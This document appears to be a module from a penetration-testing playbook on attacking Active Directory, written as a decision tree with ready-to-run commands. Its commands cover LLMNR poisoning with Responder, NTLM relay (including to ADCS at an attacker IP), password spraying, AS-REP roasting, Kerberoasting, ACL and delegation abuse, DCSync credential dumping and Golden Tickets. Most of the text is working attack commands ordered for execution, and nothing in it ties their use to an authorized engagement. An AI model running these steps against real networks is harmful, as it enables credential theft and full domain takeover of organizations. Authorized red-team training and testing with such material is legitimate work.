# Module 11: Active Directory Enumeration & Attacks

## When to Use This Module
Use this module when you are on a domain-joined system (or have domain credentials) and need to compromise the Active Directory environment. This module covers the full AD attack chain from initial enumeration through domain dominance.

## Prerequisites
- Domain-joined system OR domain credentials
- Network connectivity to domain controllers
- Tools: BloodHound, Impacket, Responder, ldapdomaindump

## Entry Check

```
Domain identified during scanning or host compromise?
├── Have domain credentials?
│   ├── Yes → Start credentialed enumeration
│   │   ├── BloodHound → Find attack paths
│   │   ├── ldapdomaindump → Dump AD structure
│   │   └── netexec → Enumerate domain hosts
│   └── No → Start unauthenticated enumeration
│       ├── Check for SMB null sessions
│       ├── Check LDAP anonymous bind
│       ├── Run Responder for hash capture
│       └── Enumerate users via Kerbrute
├── Have SYSTEM/root on a domain-joined host?
│   ├── Dump LSASS for domain creds
│   └── Enumerate domain from host context
└── Nothing? → See password attacks (Module 06) for cracking/spraying
```

## AD Enumeration

```
Domain accessible?
├── Users
│   ├── net users /domain
│   ├── BloodHound: list all domain users
│   └── kerbrute userenum -d domain.local users.txt
├── Groups
│   ├── net group /domain
│   ├── net group "Domain Admins" /domain
│   ├── net group "Enterprise Admins" /domain
│   └── BloodHound: identify high-value groups
├── Computers
│   ├── netexec smb target --users
│   └── AD: computers with unconstrained delegation
├── Service accounts (SPNs)
│   ├── setspn -T domain -Q */*
│   └── Impacket: GetUserSPNs
├── Domain trusts
│   ├── nltest /domain_trusts
│   └── BloodHound: identify trust relationships
└── ACLs / permissions
    └── BloodHound: identify interesting ACEs
```

## AD Attack Chain Decision Tree

```
AD attack flow (execute in this priority order):

1. RESPONDER / LLMNR/NBT-NS Poisoning
├── Run: sudo responder -I eth0 -wrfv
├── Captures NetNTLMv2 hashes  
│   └── Crack with hashcat -m 5600 → cleartext password
└── SMB signing disabled on any host?
    └── ntlmrelayx.py → Relay to other services

2. PASSWORD SPRAYING (if you have usernames)
├── Determine password policy first (if possible)
├── netexec smb target -u users.txt -p 'Password1'
├── Always try: <Season><Year>!, <CompanyName>1, Welcome1
└── Success → Move to BloodHound enumeration

3. AS-REP Roasting (no pre-auth required)
├── Impacket: GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
├── If user found → Crack with hashcat -m 18200
└── Success → Cleartext password for that user

4. KERBEROASTING (SPNs exist)
├── Impacket: GetUserSPNs.py domain.local/user:pass -request
├── If TGS tickets obtained → Crack with hashcat -m 13100
└── Success → Service account cleartext password

5. BloodHound Analysis
├── Linux: bloodhound-python -u user -p pass -d domain.local -ns <DC>
├── Windows (on target): SharpHound.exe -c All
├── Load data into BloodHound GUI
├── Check for:
│   ├── DA session on compromised host → Cred theft
│   ├── GenericAll/GenericWrite over high-value objects
│   ├── AdminTo relationship → Lateral movement
│   ├── DCSync rights on any account
│   ├── ForceChangePassword on privileged users
│   ├── AllExtendedRights over interesting objects
│   └── Group membership: Help Desk, Server Operators, etc.
└── Follow discovered paths to DA

6. ACL-BASED ATTACKS
├── ForceChangePassword? → net user target pass /domain
├── GenericAll on group? → Add user to group
├── WriteOwner? → Change owner, then modify
├── WriteDACL? → Grant yourself DCSync
└── AllExtendedRights? → DCSync

7. DELEGATION-BASED ATTACKS
├── Unconstrained delegation found?
│   ├── Compromise the host
│   ├── Wait for DA to connect → Steal TGT
│   └── Pass-the-Ticket → DA access
├── Constrained delegation found?
│   └── Impacket: getST.py → impersonate DA
└── Resource-based constrained delegation (RBCD)?
    └── Set msDS-AllowedToActOnBehalfOfOtherIdentity

8. ADCS (Active Directory Certificate Services)
├── ESC1: Low-priv user can enroll + SAN specified
│   └── certipy find -u user@domain -p pass -dc-ip <DC>
├── ESC3: Certificate Request Agent abuse
├── ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
├── ESC8: NTLM relay to ADCS Web enrollment
│   └── ntlmrelayx.py -t http://DC/certsrv -ip attackerIP
└── ESC9/ESC10: No security extension + user can enroll

9. DOMAIN TRUST ATTACKS
├── Child → Parent trust?
│   ├── Obtain child domain KRBTGT hash
│   ├── Extra SID: Enterprise Admins SID (parent domain SID-519)
│   └── Impacket: ticketer.py → Golden Ticket with extra SID
├── Inbound trust?
│   └── SID filtering disabled? → SID history abuse
└── Cross-forest trust?
    └── Kerberoast across trust (if configured)

10. DCSYNC (domain dominance)
├── Requirements: Replicating Directory Changes (DS-Replication-Get-Changes)
├── Who has these rights?
│   ├── Domain Admins
│   ├── Enterprise Admins
│   └── Any account with DCSync rights (from BloodHound)
├── Impacket: secretsdump.py domain/DA_user:pass@DC
│   └── Dumps: KRBTGT hash → Golden Ticket; All NTLM hashes
└── If you don't have DA → Find path via BloodHound
```

## Tool Execution Commands

```bash
# Responder (hash capture)
sudo responder -I eth0 -wrfv

# Relay (with Responder disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support

# AS-REP Roasting
impacket-GetNPUsers -dc-ip <DC> -usersfile users.txt domain.local/

# Kerberoasting
impacket-GetUserSPNs -dc-ip <DC> domain.local/user:pass -request

# BloodHound (Linux)
bloodhound-python -d domain.local -u user -p pass -ns <DC> -c All

# DCSync (requires DA/Enterprise Admin/equivalent)
impacket-secretsdump domain/DA_user:pass@<DC>

# Kerbrute user enumeration
kerbrute userenum -d domain.local --dc <DC> users.txt

# certipy (ADCS enumeration)
certipy find -u user@domain.local -p pass -dc-ip <DC>

# Delegation abuse
impacket-findDelegation domain/user:pass
impacket-getST -spn cifs/target.domain.local domain/user:pass -impersonate administrator
```

## Key Attack Flow Summary

```
Phase 1: Get a user → (Responder / Spray / Kerbrute / AS-REP)
Phase 2: Enumerate → (BloodHound / ldapdomaindump)
Phase 3: Path to DA → (Kerberoast / ACL abuse / Delegation / ADCS)
Phase 4: DCSync → (secretsdump.py)
Phase 5: Golden Ticket → (ticketer.py + pass-the-ticket)
Phase 6: Pivot → (Module 12) or Cleanup → (Module 14)
```

## Cross-References
- For password cracking → [Module 06: Password Attacks](../modules/06-password-attacks.md)
- For lateral movement between systems → [Module 12: Lateral Movement & Pivoting](../modules/12-lateral-pivot.md)
- For post-exploitation credential harvesting → [Module 13: Post-Exploitation](../modules/13-post-exploitation.md)
- For reporting DA compromise → [Module 14: Reporting](../modules/14-reporting.md)
- BloodHound cheat sheet → [assets/cheatsheets/bloodhound.md](../assets/cheatsheets/bloodhound.md)

## Output Summary
- [ ] Domain enumerated (users, groups, computers, trusts)
- [ ] BloodHound data collected and analyzed
- [ ] Attack path identified (or verified none exists)
- [ ] AS-REP roasting attempted (if no creds)
- [ ] Kerberoasting attempted (if creds obtained)
- [ ] Password spraying completed (within policy)
- [ ] ACL-based attacks attempted
- [ ] Delegation attacks attempted
- [ ] ADCS attack chain attempted
- [ ] DCSync achieved (or verified not possible)
- [ ] Domain dominance documented
